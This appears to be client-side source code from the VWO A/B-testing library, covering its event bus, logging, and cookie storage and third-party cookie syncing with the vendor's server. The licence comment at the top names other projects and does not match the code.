// This file uses references and method signatures that can be found in jquery.js and cash.js.
// Copyright JS Foundation and other contributors, https://js.foundation/
// Copyright (c) 2014-present Ken Wheeler
// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
//  * documentation files (the "Software"), to deal in the Software without restriction, including without limitation the
//  * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to
//  * permit persons to whom the Software is furnished to do so, subject to the following conditions:
//  *
//  * The above copyright notice and this permission notice shall be included in all copies or substantial portions of the
//  * Software.
//  *
//  * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE
//  * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
//  * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
//  * OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
(function () {
  "use strict";

  var e, t, n, o, i, r, s;
  window.VWO = window.VWO || [], window.VWO.v = "7.0", window.VWO.v_e = "9ea1a0228", window.VWO.modules = {
    vwoUtils: {
      cookies: {}
    },
    utils: {},
    tags: {},
    phoenixPlugins: {
      events: {
        predefinedEvents: {}
      }
    },
    otherLibDeps: {}
  }, window.VWO._ = window.VWO._ || {}, Object.defineProperty(window.VWO._, "phoenixMT", {
    value: {
      bus: {},
      idMapping: {},
      counter: 0,
      eventHistory: {},
      on: function (e, t) {
        this.bus[e] = this.bus[e] || [];
        const n = this.bus[e].push(t);
        return this.idMapping[this.counter] = [e, n - 1], this.counter++;
      },
      trigger: function (e, t) {
        var n, o, i;
        if (!this.bus[e]) return this.eventHistory[e] = this.eventHistory[e] || [], this.eventHistory[e].push(t);
        for (let r = ((null === (n = this.bus[e]) || void 0 === n ? void 0 : n.length) || 0) - 1; r >= 0; r--) null === (i = (o = this.bus[e])[r]) || void 0 === i || i.call(o, t);
      },
      getEventHistory: function (e) {
        return this.eventHistory[e];
      },
      clearEventHistory: function (e) {
        delete this.eventHistory[e];
      },
      triggerForBothSides: function (e, t = {}) {
        this.trigger(e, t), window.VWO.phoenix('trigger("${{1}}", "${{2}}")', null, {
          captureGroups: [e, t]
        });
      },
      off: function (e) {
        if (this.idMapping[e]) {
          const [t, n] = this.idMapping[e];
          t && (this.bus[t][n] = null, delete this.idMapping[e]);
        }
      }
    },
    enumerable: !1,
    writable: !1
  }), window.VWO._.enableInternalJSONStringify = -1 != [747440].indexOf(window._vwo_acc_id), window.JSONStringify = window.VWO._.enableInternalJSONStringify ? function (...e) {
    const t = Array.prototype.toJSON;
    delete Array.prototype.toJSON;
    const n = window.JSON.stringify.call(this, ...e);
    return Array.prototype.toJSON = t, n;
  } : window.JSON.stringify, function (e) {
    e.DOM = "vwo_dom";
  }(e || (e = {})), function (e) {
    e.WILD_CARD = "*", e.TRIGGER = "trigger", e.POST_INIT = "post-init", e.TIMER = "vwo_timer";
  }(t || (t = {})), function (e) {
    e.URL_CHANGE = "vwo_urlChange", e.LEAVE_INTENT = "vwo_leaveIntent", e.CLICK_EVENT = "vwo_dom_click", e.SUBMIT_EVENT = "vwo_dom_submit", e.PAGE_LOAD_EVENT = "vwo_page_load";
  }(n || (n = {})), function (e) {
    e.PAGE_VIEW = "vwo_pageView", e.PAGE_UNLOAD_EVENT = "vwo_pageUnload";
  }(o || (o = {})), function (e) {
    e.EXIT_CONDITIONS = "__exitConditions";
  }(i || (i = {})), function (e) {
    e.DOM_CONTENT_LOADED = "DOMContentLoaded", e.SCROLL = "scroll", e.CLICK = "click", e.SUBMIT = "submit";
  }(r || (r = {})), function (e) {
    e[e.DEBUG = 0] = "DEBUG", e[e.INFO = 1] = "INFO", e[e.WARN = 2] = "WARN", e[e.ERROR = 3] = "ERROR";
  }(s || (s = {}));
  class a {
    constructor(e) {
      this.setLevel(e);
    }
    setLevel(e = "warn") {
      this.logLevel = s[e.toUpperCase()];
    }
    info(e, t = {}) {
      this.customLog(s.INFO, e, t);
    }
    debug(e, t = {}) {
      this.customLog(s.DEBUG, e, t);
    }
    warn(e, t = {}) {
      var n, o;
      this.customLog(s.WARN, e, t, null === (o = null === (n = window.VWO) || void 0 === n ? void 0 : n._) || void 0 === o ? void 0 : o.customError);
    }
    error(e, t = {}) {
      var n, o;
      this.customLog(s.ERROR, e, t, null === (o = null === (n = window.VWO) || void 0 === n ? void 0 : n._) || void 0 === o ? void 0 : o.customError);
    }
    customLog(e, t, n, o = null) {
      var i, r, s;
      if (e >= this.logLevel) {
        const a = this.formatMessage(e, t, n);
        null === (s = null === (r = null === (i = window.VWOEvents) || void 0 === i ? void 0 : i.store) || void 0 === r ? void 0 : r.actions) || void 0 === s || s.addLogsForDebugging(a), o ? o(a) : this.consoleLog(e, [a]);
      }
    }
    consoleLog(e, t) {
      switch (e) {
        case s.INFO:
          console.info(...t);
          break;
        case s.WARN:
          console.warn(...t);
          break;
        case s.ERROR:
          console.error(...t);
          break;
        default:
          console.log(...t);
      }
    }
    formatMessage(t, n, o) {
      var i, a;
      const c = Object.keys(o).reduce((e, t) => e.replace(new RegExp(`{{${t}}}`, "g"), o[t]), n),
        d = `${e.DOM}_`;
      let l = o;
      const u = (null === (i = o.data) || void 0 === i ? void 0 : i.vwoEventName) || o.vwoEventName;
      return u !== d + r.CLICK && u !== d + r.SUBMIT || (l = o.data ? null === (a = o.data) || void 0 === a ? void 0 : a.props : l.props, l = l || {
        name: u
      }), `VWO: [${s[t].toUpperCase()}] [${new Date().toUTCString()}] ${c} ${JSON.stringify(l)}`;
    }
  }
  var c = new a("warn");
  /*! *****************************************************************************
      Copyright (c) Microsoft Corporation.
  
      Permission to use, copy, modify, and/or distribute this software for any
      purpose with or without fee is hereby granted.
  
      THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
      REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
      AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
      INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
      LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
      OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
      PERFORMANCE OF THIS SOFTWARE.
      ***************************************************************************** */
  function d(e, t, n, o) {
    return new (n || (n = Promise))(function (i, r) {
      function s(e) {
        try {
          c(o.next(e));
        } catch (e) {
          r(e);
        }
      }
      function a(e) {
        try {
          c(o.throw(e));
        } catch (e) {
          r(e);
        }
      }
      function c(e) {
        var t;
        e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n(function (e) {
          e(t);
        })).then(s, a);
      }
      c((o = o.apply(e, t || [])).next());
    });
  }
  const l = function (...e) {
    window.fetcher.getValue("VWO._.triggerEvent", e);
  };
  var u = {
      PARSE_TLD: "pTLD"
    },
    w = ["co", "org", "com", "net", "edu", "au", "ac"];
  function _(e) {
    var t,
      n = e.split("."),
      o = n.length,
      i = n[o - 2];
    return i && w.includes(i) ? (t = n[o - 3] + "." + i + "." + n[o - 1], l(u.PARSE_TLD, e, t), t) : (t = i + "." + n[o - 1], l(u.PARSE_TLD, e, t), t);
  }
  const g = {
    SET_COOKIE: "sC",
    GET_COOKIE: "gC",
    ERASE_COOKIE: "eC",
    SET_THIRD_PARTY_COOKIE: "sTPC",
    SET_THIRD_PARTY_COOKIE_ERROR: "sTPCE"
  };
  window._vwo_evq = window._vwo_evq || [];
  var p = "jI",
    h = window._vwo_evq;
  const v = window._vwo_ev = window._vwo_ev || function (...e) {
    if (!e[0]) throw new Error("Invalid Event:" + e[0]);
    e[0] !== p ? h.push([].slice.call(arguments)) : h.unshift([p]);
  };
  let f;
  window.VWO._.triggerEvent = window._vwo_ev;
  const E = {
    get: e => {
      try {
        return window.localStorage.getItem(e);
      } catch (e) {
        return !1;
      }
    },
    set: (e, t) => {
      try {
        return f._setItem(e, t);
      } catch (e) {
        return !1;
      }
    },
    remove: e => {
      try {
        return f._removeItem(e);
      } catch (e) {
        return !1;
      }
    }
  };
  function m(e) {
    f = e;
  }
  let O;
  function S(e) {
    O = e;
  }
  function T(e) {
    window.VWO = null != e ? e : O;
  }
  const C = window.VWO._ && window.VWO._.customError || function () {},
    y = window.encodeURIComponent,
    I = window.decodeURIComponent,
    A = function (e) {
      return btoa && O._.ac && O._.ac.bsECJ ? btoa(e) : y(e);
    },
    N = function (e) {
      if (atob) try {
        return atob(e);
      } catch (e) {}
      return I(e);
    },
    b = E.set,
    V = E.get,
    R = window.clearTimeout,
    L = window.setTimeout,
    P = Math.floor,
    D = Math.pow,
    x = "(",
    U = ")",
    k = "_vis_opt_",
    W = "_vwo_",
    M = "_vis_",
    G = 864e5,
    $ = {
      [k + "out"]: 0,
      [k + "exp_*_combi"]: 10,
      [k + "exp_*_combi_choose"]: 11,
      [k + "exp_*_goal_*"]: 12,
      [k + "exp_*_exclude"]: 13,
      [k + "exp_*_split"]: 14,
      [k + "test_cookie"]: 20,
      [k + "s"]: 21,
      [W + "ds"]: 22,
      [W + "sn"]: 23,
      [W + "referrer"]: 24,
      [W + "uuid"]: 30,
      [W + "uuid_*"]: 31,
      [W + "uuid_v2"]: 32,
      [W + "app_version_*_*"]: 40,
      [M + "preview_*"]: 41,
      [M + "editor"]: 42,
      [M + "heatmap_*"]: 43
    };
  let F;
  for (const e in $) $[e] = X($[e]), $["debug" + e] = "d" + $[e];
  function j() {
    for (var e = document.cookie.split(/; ?/), t = {}, n = 0; n < e.length; n++) {
      var o = e[n].split("=");
      try {
        const e = I(o[0]);
        let n;
        n = "_vwo" === e ? N(o[1]) : I(o[1]), t[e] = n;
      } catch (e) {}
    }
    return t;
  }
  function B(e) {
    return ["_vis_opt_out", "_vwo_ssm", "_vwo_ss", "_vwo_global_opt_out"].indexOf(e) < 0 && (e.indexOf("_vis_opt_") > -1 || e.indexOf("_vwo_") > -1 || e.indexOf("_vis_") > -1);
  }
  function H(e) {
    let t, n;
    return () => (n = n || L(() => {
      n = t = void 0;
    }, 1), t = t || e());
  }
  let K = H(j);
  function J(e) {
    return K()[I(e)];
  }
  function Y(e, t, n, o = 4e12) {
    t = "_vwo" === e ? A(t) : y(t);
    let i = y(e) + "=" + t + "; ";
    n && (i += "domain=" + n + "; "), o && (i += "expires=" + new Date(o).toUTCString() + "; "), i += "path=/", window.VWO._ = window.VWO._ || {}, window.VWO._.ss && (i += "; secure; samesite=none"), document.cookie = i, K = H(j);
  }
  function q() {
    K = H(j);
  }
  function X(e) {
    "string" == typeof e && (e = +e), e < 0 && (e = 0);
    let t = "";
    for (; e;) {
      const n = e % 64;
      let o = n.toString(36);
      n >= 36 && (o = String.fromCharCode(n + 29)), 62 === n && (o = "_"), 63 === n && (o = "-"), t = o + t, e = P(e / 64);
    }
    return t || e + "";
  }
  function z(e) {
    let t = 0,
      n = 0;
    for (; e;) {
      const o = e.slice(-1);
      let i = 26 * +/[A-Z]/.test(o) + parseInt(o, 36);
      "_" === o && (i = 62), "-" === o && (i = 63), t += i * D(64, n++), e = e.slice(0, -1);
    }
    return t;
  }
  function Z(e, t) {
    return !e || "number" != typeof e[2] || Date.now() > t + e[2] * G;
  }
  class Q {
    constructor(e, t, n = "cookie", o = !0, i, r, s) {
      var a, c, d, l;
      this.threadInstanceSync = !1, this.defaultDelim1 = (null === (c = null === (a = window._vwoCc) || void 0 === a ? void 0 : a.cJ) || void 0 === c ? void 0 : c.pd) || "~", this.delim1 = (null === (l = null === (d = window._vwoCc) || void 0 === d ? void 0 : d.cJ) || void 0 === l ? void 0 : l.cd) || this.defaultDelim1, this.backwardCompatible = o, this.cookieSyncUrl = i, this.jarName = e, this.cookieStorageStrategy = n, this.domain = t, this.syncingOff = r, this.strategyConfig = s, this.syncingOff ? this.cookies = this.syncFromTPCValue() : this.cookies = this.syncFromCookies(), this.strategyConfig && (this.strategyConfig.callback = this.strategyConfig.callback || function () {}, this.strategyConfig.cookieJarValue = this.strategyConfig.cookieJarValue || ""), F = z(this.getInJar("ts") || "0") || Date.now(), this.setInJar("ts", X(F), 2e3), this.backwardCompatible && this.getAll(!1, !0), this.backwardCompatible || this.syncingOff || "custom" === n || this.syncCookiesToJar(), this.threadInstanceSync = !0;
    }
    syncCookiesToJar() {
      const e = document.cookie.split(/; ?/),
        t = this.getAll();
      for (var n = 0; n < e.length; n++) {
        const o = e[n].split("="),
          i = t[o[0]];
        B(o[0]) && !i && (this.setInJar(I(o[0]), I(o[1]), 100), window.VWO._.cookies.create(o[0], o[1], void 0, void 0, -1, !0));
      }
    }
    getInJar(e, t = !1) {
      if (e = this.mapKey(e), !this.cookies) return;
      const n = this.cookies[e];
      return Z(n, F) ? (delete this.cookies[e], void (this.syncingOff || this.syncToCookies())) : t ? n.slice(1) : n[1];
    }
    expired(e) {
      e = this.mapKey(e);
      const t = this.cookies[e];
      if (t) return Z(t, F);
    }
    setInJar(e, t, n) {
      return e = this.mapKey(e), this.cookies[e] = [e, t, n + (Date.now() - F) / G], this.threadInstanceSync && this.otherSide("updateJarMemory", [e, this.cookies[e]]), this.syncingOff || this.syncToCookies(), this.getInJar(e);
    }
    syncToCookies() {
      let e = "";
      for (const t in this.cookies) {
        const n = this.cookies[t];
        e += (e ? U : "") + this.encodeCookie(...n);
      }
      if ("custom" === this.cookieStorageStrategy) return q(), e = A(e), void this.strategyConfig.callback(e);
      "ls" !== this.cookieStorageStrategy && "both" !== this.cookieStorageStrategy || b(this.jarName, e), "cookie" !== this.cookieStorageStrategy && "both" !== this.cookieStorageStrategy || Y(this.jarName, e, this.domain);
    }
    getStoredJarValue(e) {
      let t = "";
      for (const e in this.cookies) {
        const n = this.cookies[e];
        t += (t ? U : "") + this.encodeCookie(...n);
      }
      return e ? A(t) : t;
    }
    syncFromTPCValue() {
      let e = window.VWO.data.tpc ? window.VWO.data.tpc._vwo : void 0;
      const t = {};
      if (!e) return t;
      e = e.split(U);
      for (let n = 0; n < e.length; n++) {
        const o = this.decodeCookie(e[n], this.cookieStorageStrategy);
        o && (t[o[0]] = o);
      }
      return t;
    }
    syncFromCookies() {
      let e = "";
      this.cookies = {}, "custom" === this.cookieStorageStrategy ? e = N(this.strategyConfig.cookieJarValue) : "ls" === this.cookieStorageStrategy ? e = V(this.jarName) : "cookie" === this.cookieStorageStrategy ? e = J(this.jarName) : "both" === this.cookieStorageStrategy && (e = J(this.jarName) || V(this.jarName)), e = e || "";
      const t = e.split(U);
      for (let n = 0; e && n < t.length; n++) {
        const e = this.decodeCookie(t[n], this.cookieStorageStrategy);
        e && (this.cookies[e[0]] = e);
      }
      return this.cookies;
    }
    encodeCookie(e, t, n) {
      return `${e}${this.delim1}${t}${x}${X(P(100 * n))}`;
    }
    decodeCookie(e, t) {
      try {
        let t;
        const n = e.indexOf(this.delim1) > -1 ? this.delim1 : this.defaultDelim1;
        if (e.indexOf(n) > -1) t = e.split(n);else {
          const n = /ts(.)/.exec(e),
            o = n && n[1];
          o && (t = e.split(o), this.delim1 = o);
        }
        const o = t[1].split(x);
        return [t[0], o[0], z(o[1]) / 100];
      } catch (n) {
        const o = `Error occurred while decoding the cookie in cookieJar for strategy: ${t}. Cookie Value to be decoded: ${e}. ${n}`;
        return void C({
          msg: o,
          url: "cookie-jar.js",
          lineno: 257,
          colno: 26,
          source: y(o)
        });
      }
    }
    mapKey(e) {
      if ($[e]) return $[e];
      const t = /([0-9]+)/g,
        n = e.replace(t, "*");
      if ($[n]) {
        const o = e.match(t) || [];
        return $[n] + "*" + o.map(X).join("*");
      }
      return e;
    }
    unmapKey(e) {
      const t = e.split("*"),
        n = t[0];
      let o = "";
      for (const e in $) if ($[e] === n) {
        o = e;
        break;
      }
      for (let e = 1; e < t.length; e++) o = o.replace("*", "" + z(t[e]));
      return (o || "ts" === e) && o || e;
    }
    getAll(e = !1, t = !1) {
      const n = {};
      for (const o in this.cookies) {
        const i = this.unmapKey(o);
        let r = this.cookies[o][1];
        "ts" !== o && (r = this.get(i, t)), !1 === this.expired(o) && (n[i] = e ? [r, new Date(this.cookies[o][2] * G + F)] : r);
      }
      return n;
    }
    get(e, t = !1) {
      const n = this.expired(e),
        o = this.getInJar(e, !0);
      let i, r;
      o && ([i, r] = o);
      const s = "*" === i;
      if ("custom" !== this.cookieStorageStrategy && s) {
        const t = J(e);
        return !t && i && this.setInJar(e, "", -1), t;
      }
      if (this.backwardCompatible) {
        const o = J(e);
        return o && n ? void Y(e, "", this.domain, -1) : (!t || !i || "ts" === e || o && o !== i || Y(e, i, this.domain, F + r * G), o || !i || t || "ts" === e ? (o && i && o !== i && this.setInJar(e, o, r - (Date.now() - F) / G), o || i) : void this.setInJar(e, "", -1));
      }
      return this.getInJar(e);
    }
    xmlSuccess() {
      window.VWO._.cookies.create("_vis_opt_test_cookie", 1, void 0, void 0, void 0, !0);
    }
    set(e, t, n) {
      if (t += "", "number" == typeof n ? this.setInJar(e, t, n) : this.setInJar(e, "*", 2e3), "custom" !== this.cookieStorageStrategy && (this.backwardCompatible || "number" != typeof n)) {
        let o;
        o = null === n ? null : Date.now() + n * G, Y(e, t, this.domain, o);
      }
      this.cookieSyncUrl && (R(this.cookieSyncTimeout), this.cookieSyncTimeout = L(() => {
        this.syncViaXML(this.xmlSuccess);
      }, 1e3));
    }
    updateJarMemory(e, t) {
      this.cookies[e] = t;
    }
    otherSide(...e) {
      e[0] = "VWO.modules.vwoUtils.cookies.CookieJar." + e[0], window.fetcher.getValue(...e);
    }
  }
  const ee = {
    primary: (e, t, n = !1, o, i) => new Proxy(t, {
      construct(t, r) {
        this.store = this.store || ["1"];
        const s = new t(...r),
          a = this.store.length;
        this.store.push(s);
        let c = r;
        n && (c = o(s)), Object.defineProperty(s, "otherSideCreated", {
          value: !1,
          enumerable: !1,
          writable: !0
        }), s.otherSide = (...e) => s.otherSideCreated.then(() => s.otherSide(...e).then(e => e));
        const d = {
          type: "vwoClassInstanceBridge",
          id: a,
          args: c,
          path: e
        };
        return s.otherSideCreated = new Promise(t => {
          window.fetcher.request(d).send().then(n => {
            s.otherSide = (...t) => {
              const o = e.dest + "." + n + "." + t[0];
              return t[0] = o, window.fetcher.getValue(...t);
            }, t(null), i && i(n);
          });
        }), s;
      },
      get(e, t) {
        return "symbol" == typeof t || isNaN(+t) ? e : this.store[t];
      }
    }),
    secondary: (e, t, n) => new Proxy(t, {
      construct(e, t) {
        this.store = this.store || ["1"];
        const o = new e(...t),
          i = this.store.length;
        return this.store.push(o), n && n(o), [i, o];
      },
      get(e, t) {
        return "symbol" == typeof t || isNaN(+t) ? e : this.store[t];
      }
    })
  };
  class te extends Q {
    syncViaXML(e) {
      if (!window.XMLHttpRequest) return;
      const t = new XMLHttpRequest();
      t.addEventListener("load", e), t.open("GET", this.cookieSyncUrl, !0), t.withCredentials = !0, t.send(null);
    }
  }
  const ne = ee.primary({
    src: "VWO.modules.vwoUtils.cookies.CookieJar",
    dest: "VWO.modules.vwoUtils.cookies.CookieJar"
  }, te);
  function oe(e) {
    var t = [];
    for (var n in e) e.hasOwnProperty(n) && t.push(n);
    return t;
  }
  window.VWO.modules.vwoUtils.cookies.CookieJar = ne;
  var ie = {},
    re;
  function se(e, t) {
    const n = document.createEvent("Event");
    e = "vwo." + e, n.initEvent && (n.initEvent(e, !1, !1), n.data = t, document.dispatchEvent && document.dispatchEvent(n));
  }
  function ae(e, t) {
    ie.queue = ie.queue || [];
    const n = window.VWO._.ac && window.VWO._.ac.rdbg;
    if ("meta" == e && !n) return;
    if (!document.createEvent) return;
    const o = window.VWO;
    if (!o.nls || !o.nls.Recording) return void ie.queue.push({
      eventName: e,
      data: t
    });
    ie.queue.push({
      eventName: e,
      data: t
    });
    const i = ie.queue.splice(0);
    for (var r of i) se(r.eventName, r.data);
  }
  window.VWO.modules.vwoUtils.utils = {
    customEvent: ae
  }, function (e) {
    e[e.Object = 0] = "Object", e[e.Property = 1] = "Property", e[e.Document = 2] = "Document", e[e.Variable = 3] = "Variable", e[e.OverWrite = 4] = "OverWrite", e[e.Delete = 5] = "Delete";
  }(re || (re = {}));
  const {
    toString: ce
  } = Object.prototype;
  function de(e) {
    return "[object Object]" === ce.call(e);
  }
  function le(e) {
    return "[object Array]" === ce.call(e);
  }
  function ue(e) {
    return "[object Null]" === ce.call(e);
  }
  function we(e) {
    return "[object Undefined]" === ce.call(e);
  }
  function _e(e) {
    return !we(e) && !ue(e);
  }
  function ge(e) {
    return !Number.isNaN(e) && "[object Number]" === ce.call(e);
  }
  function pe(e) {
    return "[object String]" === ce.call(e);
  }
  let he = !1;
  class ve {
    constructor() {
      this.operations = [];
    }
    getCookieObject(e) {
      const t = {};
      return e.split(";").forEach(e => {
        const [n, o = ""] = e.split("=").map(e => e.trim());
        t[n] = o;
      }), t;
    }
    push(e, t) {
      this.operations.push({
        name: e,
        value: t
      });
    }
    pop_front() {
      this.operations.splice(0, 1);
    }
    fullfil(e, t = !0) {
      const n = this.getCookieObject(e);
      t && this.pop_front(), this.operations.forEach(e => {
        n[e.name] = e.value;
      });
      return Object.entries(n).map(e => e.join("=")).join("; ");
    }
  }
  class fe {
    static internalUtils() {
      var e, t;
      return {
        isCookiePayloadObject: e => !(!de(e) || !["value", "fromThread", "origin"].reduce((t, n) => t && n in e, !0)),
        isCurrentContextMT: !!(null === (t = null === (e = window) || void 0 === e ? void 0 : e.mainThread) || void 0 === t ? void 0 : t.webWorker),
        getCookieAttributes: e => {
          const t = {};
          return e.split(";").forEach(e => {
            const [n, o = ""] = e.split("=").map(e => e.trim());
            t[n] = o;
          }), t;
        }
      };
    }
    getSetter(e) {
      return t => {
        if ("string" == typeof t) t = {
          value: t
        };else if (!fe.internalUtils().isCookiePayloadObject(t)) return void console.error("Invalid value type!");
        const {
          value: n,
          fromThread: o
        } = t;
        let {
            origin: i
          } = t,
          r = !0;
        return (fe.internalUtils().isCurrentContextMT || "MAIN" === o) && (document.__cookie = n, r = "MAIN" !== o), r && e({
          type: "sync",
          data: {
            propertyName: "cookie",
            value: {
              value: fe.internalUtils().isCurrentContextMT ? document.__cookie : n,
              fromThread: fe.internalUtils().isCurrentContextMT ? "MAIN" : "WORKER",
              origin: he ? "WORKER" : i
            }
          },
          syncType: re.Document
        }), !0;
      };
    }
  }
  function Ee(e) {
    if (!fe.internalUtils().isCookiePayloadObject(e)) return void console.error("Invalid value type!");
    const {
      value: t
    } = e;
    he = !0, document.cookie = t, he = !1;
  }
  let me = {};
  {
    class e {
      constructor() {
        this.enabled = !1, this.lastSentCookieString = "";
      }
      isEnabled() {
        return this.enabled;
      }
      enable() {
        this.enabled || (this.enabled = !0, window.fetcher.setValue("window.VWO._.isCookieFallbackEnabled", !0));
      }
      syncCookieToWorkerThread(e = fe.internalUtils().isCurrentContextMT ? "MAIN" : "WORKER") {
        !this.enabled || this.lastSentCookieString === document.cookie && "WORKER" !== e || (this.lastSentCookieString = document.cookie, window.fetcher.postMessage({
          type: "sync",
          data: {
            propertyName: "cookie",
            value: {
              value: document.cookie,
              fromThread: fe.internalUtils().isCurrentContextMT ? "MAIN" : "WORKER",
              origin: e
            }
          },
          syncType: re.Document
        }));
      }
      applySyncRequest(e) {
        const {
          value: t
        } = e;
        if (!t) return window.VWO && window.VWO._ && window.VWO._.customError && window.VWO._.customError({
          msg: "Syncing error occurred in cookie fallback mode - value not present!",
          url: "fallback/cookies.ts",
          lineno: 65,
          colno: 10,
          source: JSONStringify(t)
        });
        document.cookie = t, this.syncCookieToWorkerThread("WORKER");
      }
    }
    me = new e();
  }
  var Oe = window._vis_opt_cookieDays,
    Se = window._vwo_exp || {},
    Te,
    Ce = window._vwo_acc_id,
    ye = [],
    Ie = 0,
    Ae,
    Ne = function () {
      for (var e = 0; e < ye.length; e++) ye[e].d || (ye[e].c(), ye[e].d = !0);
    };
  function be() {
    return window._vis_debug;
  }
  function Ve(e) {
    const t = window.VWO;
    return t._.cLFE || !t.data.cj || Object.values(t.data.cj).every(e => void 0 === e) || (e.backwardCompatible = t.data.cj.bc || !1, e.strategy = e.strategy || t.data.cj.s), e;
  }
  const Re = {
    domain: void 0,
    _create: function (e, t, n, o, i, r, s) {
      var a, c;
      be() && 0 !== e.indexOf("debug") && (e = "debug" + e), window.VWO._.cLFE, "_vwo_sn" !== e && "_vwo_ds" !== e && "_vis_opt_test_cookie" !== e && !isNaN(Oe = parseFloat(Oe)) && isFinite(Oe) && (n = Oe);
      var d = "";
      if (i ? d += "; expires=" + new Date(i).toGMTString() : n ? d += "; expires=" + new Date(new Date().getTime() + 864e5 * n).toGMTString() : !1 === n && (d = "; expires=Thu, 01 Jan 1970 00:00:01 GMT"), o || (o = Re.domain), void 0 !== o) {
        o = (null === (c = null === (a = window.VWO._.allSettings.dataStore.plugins.DACDNCONFIG) || void 0 === a ? void 0 : a.jsConfig) || void 0 === c ? void 0 : c.dNISD) && !window._vis_opt_domain ? "" : "; domain=." + o;
      }
      const l = e + "=" + encodeURIComponent(t) + d + (o || "") + "; path=/";
      window.VWO._.ss && !s ? document.cookie = l + "; secure; samesite=none" : document.cookie = l;
    },
    create: function (e, t, n, o, i, r, s) {
      this._create(e, t, n, o, i, r, s), me.syncCookieToWorkerThread(), v(g.SET_COOKIE, e, t, n, i), ae("meta", {
        ckName: e,
        ckValue: t,
        ckDays: n,
        ckExpiryTs: i
      });
    },
    get: function (e, t, n) {
      var o;
      e = e.trim(), !n && be() && (e = "debug" + e), window.VWO._.cLFE;
      var i = document.cookie.match(new RegExp("(?:^|;)\\s*" + e.replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1") + "=(.*?)(?:;|$)", "i"));
      return o = i && decodeURIComponent(i[1]), v(g.GET_COOKIE, e, o), o;
    },
    erase: function (e, t, n) {
      this.create(e, "", !1, t, 1, n), v(g.ERASE_COOKIE, e);
    },
    mergeInFPJar: function () {
      if (window.VWO._.cLFE) return;
      const e = this.createThirdPartyJar().getAll(!0);
      for (const t in e) {
        if ("ts" === t) continue;
        const n = e[t][1],
          o = e[t][0];
        window.VWO._.jar.set(t, o, (n - Date.now()) / 864e5);
      }
    },
    createThirdPartyJar: function () {
      return Te || (Te = new ne("_vwo_third_party", Re.domain, void 0, !1, void 0, !0), window.VWO._.tpj = Te, Te);
    },
    setThirdPartyCookiesInJar: function (e, t, n, o) {
      const i = this.createThirdPartyJar(),
        r = o ? (o - Date.now()) / 864e5 : n;
      i.set(e, t, r);
    },
    getThirdPartyJarValue: function () {
      const e = Te.getStoredJarValue();
      return e.length ? e : null;
    },
    createThirdParty: function (e, t, n, o, i, r, s) {
      if (!window.mainThread) return window.fetcher.getValue("VWO._.cookies.createThirdParty", [e, t, n, o, i, r, s]);
      var a, c, d, l;
      let u = !1;
      if (i && (u = s ? s.multiple_domains : Se[i].multiple_domains), "_vwo" !== e && this._create(e, t, n, o), be() && 0 !== e.indexOf("debug") && (e = "debug" + e), !((l = window.vwo_$) && i && u || r || "_vwo" === e)) return void v(g.SET_THIRD_PARTY_COOKIE_ERROR, e, t, n, o);
      a = l("<iframe>").attr({
        height: "1px",
        width: "1px",
        border: "0",
        class: "vwo_iframe",
        name: "vwo_" + Math.random(),
        style: "position: absolute; left: -2000px; display: none"
      }).appendTo("head").load(function () {
        -1 !== e.indexOf("split") && this.parentNode.removeChild(this), --Ie || Ne();
      }), Ie++;
      const w = window._vwo_server_url || "https://dev.visualwebsiteoptimizer.com";
      c = w + "/ping_tpc.php?account=" + Ce + "&name=" + encodeURIComponent(e) + "&value=" + encodeURIComponent(t) + "&days=" + n + "&random=" + Math.random(), /MSIE (\d+\.\d+);/.test(navigator.userAgent) ? a.attr("src", c) : 767218 === window._vwo_acc_id || window.VWO._.lastPageUnloadURL ? window.VWO.modules.tags.dataSync.utils.sendCall(null, {
        url: "/ping_tpc.php?account=" + Ce + "&name=" + encodeURIComponent(e) + "&value=" + encodeURIComponent(t) + "&days=" + n + "&random=" + Math.random()
      }, null, null, !0) : ((d = l("<form>").attr({
        action: w + "/ping_tpc.php",
        "accept-charset": "UTF-8",
        target: a.attr("name"),
        enctype: "application/x-www-form-urlencoded",
        method: "post",
        id: "vwo_form",
        style: "display:none"
      }).appendTo("head")).attr("action", c).submit(), d.remove()), v(g.SET_COOKIE, e, t, n, i, !0);
    },
    waitForThirdPartySync: function (e) {
      return d(this, void 0, void 0, function* () {
        window.mainThread ? ye.push({
          c: e
        }) : yield window.fetcher.getValue('VWO._.cookies.waitForThirdPartySync("${{1}}")', null, {
          captureGroups: [e]
        });
      });
    },
    setJar(e) {
      window.VWO._.jar = Ae = e;
    },
    init: function (e) {
      window.VWO._.jar = null;
    },
    getAll: function (e = !1) {
      const t = document.cookie.split(/; ?/),
        n = {};
      for (let e = 0; e < t.length; e++) {
        const o = t[e].split("="),
          i = o[0],
          r = o[1];
        try {
          n[i] = r;
        } catch (e) {}
      }
      return n;
    },
    getItem: function (e, t = !1) {
      return e.indexOf("_vis_opt_") > -1 || e.indexOf("_vwo_") > -1 ? this.get(e) || this.get(e, !0) : this.get(e, !0, !0);
    },
    setItem: function (e, t) {
      this.create(e, t);
    },
    deleteAll: function () {},
    deleteItem: function () {},
    includes: function (e, t = !1) {
      const n = new RegExp(e),
        o = Object.keys(Re.getAll());
      for (let e = 0; e < o.length; e++) if (n.test(o[e])) return 1;
      return 0;
    }
  };
  var Le;
